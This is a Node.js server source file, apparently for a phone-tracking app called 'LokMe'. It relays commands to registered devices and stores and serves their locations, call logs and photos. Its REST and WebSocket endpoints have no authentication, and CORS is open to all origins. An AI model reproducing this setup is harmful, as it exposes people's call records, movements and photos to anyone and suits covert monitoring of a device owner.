require('dotenv').config();
const express = require('express');
const http = require('http');
const { WebSocketServer } = require('ws');
const cors = require('cors');
const { v4: uuidv4 } = require('uuid');
const { createClient } = require('@supabase/supabase-js');

const app = express();
const server = http.createServer(app);
const wss = new WebSocketServer({ server, path: '/ws' });

app.use(cors());
app.use(express.json());
app.use(express.static('../dashboard'));

const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_KEY
);

// Connected devices: deviceId -> { ws, lastSeen }
const connectedDevices = new Map();

// WebSocket server
wss.on('connection', (ws, req) => {
  console.log('WebSocket connection established');

  let deviceId = null;

  ws.on('message', async (data) => {
    try {
      const msg = JSON.parse(data.toString());

      switch (msg.type) {
        case 'register':
          deviceId = msg.device_id;
          connectedDevices.set(deviceId, { ws, lastSeen: Date.now() });
          console.log(`Device registered: ${deviceId}`);

          // Update device online status in Supabase
          await supabase
            .from('devices')
            .upsert({
              id: deviceId,
              is_online: true,
              last_seen: new Date().toISOString()
            }, { onConflict: 'id' });
          break;

        case 'response':
          console.log(`Response from ${msg.device_id}: ${msg.command_type} - ${msg.success}`);
          // Update command status in Supabase
          await supabase
            .from('commands')
            .update({ status: msg.success ? 'completed' : 'failed' })
            .eq('id', msg.command_id);

          // Forward response to dashboard via broadcast
          broadcastToDashboard({
            type: 'device_response',
            device_id: msg.device_id,
            command_id: msg.command_id,
            command_type: msg.command_type,
            success: msg.success,
            data: msg.data
          });
          break;

        case 'heartbeat':
          if (connectedDevices.has(msg.device_id)) {
            connectedDevices.get(msg.device_id).lastSeen = Date.now();
          }
          await supabase
            .from('devices')
            .update({ last_seen: new Date().toISOString() })
            .eq('id', msg.device_id);
          break;
      }
    } catch (e) {
      console.error('WS message error:', e.message);
    }
  });

  ws.on('close', async () => {
    if (deviceId) {
      connectedDevices.delete(deviceId);
      console.log(`Device disconnected: ${deviceId}`);
      await supabase
        .from('devices')
        .update({ is_online: false })
        .eq('id', deviceId);
    }
  });
});

// Dashboard WebSocket connections
const dashboardClients = new Set();

wss.on('connection', (ws, req) => {
  // Check if this is a dashboard connection (query param)
  const url = new URL(req.url, `http://${req.headers.host}`);
  if (url.searchParams.get('client') === 'dashboard') {
    dashboardClients.add(ws);
    console.log('Dashboard client connected');

    // Send current device list
    ws.send(JSON.stringify({
      type: 'device_list',
      devices: Array.from(connectedDevices.keys())
    }));

    ws.on('close', () => {
      dashboardClients.delete(ws);
    });
  }
});

function broadcastToDashboard(data) {
  const msg = JSON.stringify(data);
  dashboardClients.forEach(ws => {
    if (ws.readyState === 1) ws.send(msg);
  });
}

// ===== REST API =====

// Get all devices
app.get('/api/devices', async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('devices')
      .select('*')
      .order('last_seen', { ascending: false });

    if (error) throw error;

    // Merge online status from connected devices
    const devices = data.map(d => ({
      ...d,
      is_online: connectedDevices.has(d.id)
    }));

    res.json(devices);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Send command to device
app.post('/api/command', async (req, res) => {
  try {
    const { device_id, command_type, payload } = req.body;

    if (!device_id || !command_type) {
      return res.status(400).json({ error: 'device_id and command_type required' });
    }

    const commandId = uuidv4();

    // Save command to Supabase
    await supabase.from('commands').insert({
      id: commandId,
      device_id,
      command_type,
      payload: payload ? JSON.stringify(payload) : null,
      status: 'pending'
    });

    // Send to device via WebSocket
    const device = connectedDevices.get(device_id);
    if (device && device.ws.readyState === 1) {
      device.ws.send(JSON.stringify({
        command_type,
        command_id: commandId,
        payload: payload ? JSON.stringify(payload) : ''
      }));

      res.json({ command_id: commandId, status: 'sent' });
    } else {
      await supabase
        .from('commands')
        .update({ status: 'device_offline' })
        .eq('id', commandId);
      res.json({ command_id: commandId, status: 'device_offline' });
    }
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Get command history
app.get('/api/commands/:deviceId', async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('commands')
      .select('*')
      .eq('device_id', req.params.deviceId)
      .order('created_at', { ascending: false })
      .limit(50);

    if (error) throw error;
    res.json(data);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Get device locations
app.get('/api/device/:deviceId/location', async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('locations')
      .select('*')
      .eq('device_id', req.params.deviceId)
      .order('timestamp', { ascending: false })
      .limit(100);

    if (error) throw error;
    res.json(data);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Get device call logs
app.get('/api/device/:deviceId/calllogs', async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('call_logs')
      .select('*')
      .eq('device_id', req.params.deviceId)
      .order('call_date', { ascending: false })
      .limit(100);

    if (error) throw error;
    res.json(data);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Get device photos
app.get('/api/device/:deviceId/photos', async (req, res) => {
  try {
    const { data, error } = await supabase
      .from('photos')
      .select('*')
      .eq('device_id', req.params.deviceId)
      .order('created_at', { ascending: false })
      .limit(50);

    if (error) throw error;
    res.json(data);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ===== DELETE ENDPOINTS =====

// Delete a photo (storage + db)
app.delete('/api/photos/:photoId', async (req, res) => {
  try {
    const { data: photo, error: fetchErr } = await supabase
      .from('photos')
      .select('*')
      .eq('id', req.params.photoId)
      .single();

    if (fetchErr) throw fetchErr;

    // Extract storage path from URL
    const urlParts = photo.storage_url.split('/storage/v1/object/public/photos/');
    if (urlParts.length > 1) {
      await supabase.storage.from('photos').remove([urlParts[1]]);
    }

    await supabase.from('photos').delete().eq('id', req.params.photoId);
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Delete all photos for a device
app.delete('/api/device/:deviceId/photos', async (req, res) => {
  try {
    const { data: photos } = await supabase
      .from('photos')
      .select('storage_url')
      .eq('device_id', req.params.deviceId);

    if (photos && photos.length > 0) {
      const paths = photos.map(p => {
        const parts = p.storage_url.split('/storage/v1/object/public/photos/');
        return parts.length > 1 ? parts[1] : null;
      }).filter(Boolean);

      if (paths.length > 0) {
        await supabase.storage.from('photos').remove(paths);
      }
    }

    await supabase.from('photos').delete().eq('device_id', req.params.deviceId);
    res.json({ success: true, deleted: photos?.length || 0 });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Delete a call log entry
app.delete('/api/calllogs/:logId', async (req, res) => {
  try {
    await supabase.from('call_logs').delete().eq('id', req.params.logId);
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Delete all call logs for a device
app.delete('/api/device/:deviceId/calllogs', async (req, res) => {
  try {
    const { count } = await supabase
      .from('call_logs')
      .delete()
      .eq('device_id', req.params.deviceId);
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Delete all locations for a device
app.delete('/api/device/:deviceId/locations', async (req, res) => {
  try {
    await supabase.from('locations').delete().eq('device_id', req.params.deviceId);
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Delete all commands for a device
app.delete('/api/device/:deviceId/commands', async (req, res) => {
  try {
    await supabase.from('commands').delete().eq('device_id', req.params.deviceId);
    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Delete a device and ALL its data
app.delete('/api/device/:deviceId', async (req, res) => {
  try {
    const id = req.params.deviceId;

    // Delete photos from storage first
    const { data: photos } = await supabase.from('photos').select('storage_url').eq('device_id', id);
    if (photos && photos.length > 0) {
      const paths = photos.map(p => {
        const parts = p.storage_url.split('/storage/v1/object/public/photos/');
        return parts.length > 1 ? parts[1] : null;
      }).filter(Boolean);
      if (paths.length > 0) await supabase.storage.from('photos').remove(paths);
    }

    // Delete all related data
    await supabase.from('photos').delete().eq('device_id', id);
    await supabase.from('call_logs').delete().eq('device_id', id);
    await supabase.from('locations').delete().eq('device_id', id);
    await supabase.from('commands').delete().eq('device_id', id);
    await supabase.from('devices').delete().eq('id', id);

    res.json({ success: true });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Get storage usage stats
app.get('/api/stats', async (req, res) => {
  try {
    const [devices, photos, callLogs, locations, commands] = await Promise.all([
      supabase.from('devices').select('id', { count: 'exact', head: true }),
      supabase.from('photos').select('id', { count: 'exact', head: true }),
      supabase.from('call_logs').select('id', { count: 'exact', head: true }),
      supabase.from('locations').select('id', { count: 'exact', head: true }),
      supabase.from('commands').select('id', { count: 'exact', head: true }),
    ]);

    res.json({
      devices: devices.count || 0,
      photos: photos.count || 0,
      call_logs: callLogs.count || 0,
      locations: locations.count || 0,
      commands: commands.count || 0
    });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({
    status: 'ok',
    connected_devices: connectedDevices.size,
    dashboard_clients: dashboardClients.size
  });
});

// Start server
const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`LokMe server running on port ${PORT}`);
  console.log(`WebSocket endpoint: ws://localhost:${PORT}/ws`);
  console.log(`Dashboard: http://localhost:${PORT}`);
});
